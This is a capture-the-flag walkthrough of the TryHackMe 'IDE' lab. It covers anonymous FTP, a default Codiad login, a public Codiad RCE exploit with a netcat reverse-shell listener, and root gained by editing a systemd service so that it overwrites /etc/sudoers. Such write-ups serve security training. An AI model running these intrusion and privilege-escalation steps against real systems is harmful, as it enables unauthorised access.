**Category:** Linux

**Difficulty:** Easy

**Status:** Completed

**Link:** https://tryhackme.com/room/ide

---

## 1. Challenge Description

An easy box to polish your enumeration skills!

## 2. Enumeration

### Basic scan

```bash
nmap -sS -p- -Pn <IP>
```



### Detail scan

```bash
nmap -T4 -A -p 21,22,80,62337 <IP>
```


## 3. **FTP Enumeration**

```bash
ftp <IP>
# name : anonymous
#password : empty
```



```bash
ls -la
cd ...
ls -la
get -
```

![image.png](attachment:0a525e6e-37ab-4dff-be9d-057a5b852f73:image.png)

```bash
cp - test
cat test
```



> It appears that `john` and `drac` are potential users in the target system.
> 

## 4.HTTP Port 62337

 



> the user is `john` and default password is `password`
> 



### Codiad 2.8.4

> Search on Codiad 2.8.4 exploit and download the py file
> 

[Codiad 2.8.4 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/49705)

### Usage



```bash
nc -lvnp 4444 #root privilege
```

```bash
└─$ python3 exploit.py http://<IP>:62337/ john password <MY VM IP> 4444 linux
```

### User flag



```bash
cd home/drac
ls -lna
```

```bash
cat user.txt
www-data@ide:/home/drac$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

```bash
cat .bash_history
```



```bash
ssh drac@IP 
#password is TH...
```



### Root flag



> We can executo /usr/sbin/service vsftpd restart as sudo so we can try to change the vsftpd.service to execute a reverse shell when we restart the service.
> 

```bash
drac@ide:~$ cat /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

```bash
nano /lib/systemd/system/vsftpd.service
```

```bash
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c 'echo "drac ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target

```

```bash
 /usr/sbin/service vsftpd restart
```

```bash
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password:
==== AUTHENTICATION COMPLETE ===

drac@ide:~$ sudo -l
User drac may run the following commands on ide:
    (root) NOPASSWD: ALL
```

```bash
drac@ide:~$ sudo su
root@ide:/home/drac# cd
root@ide:~# ls
root.txt
```
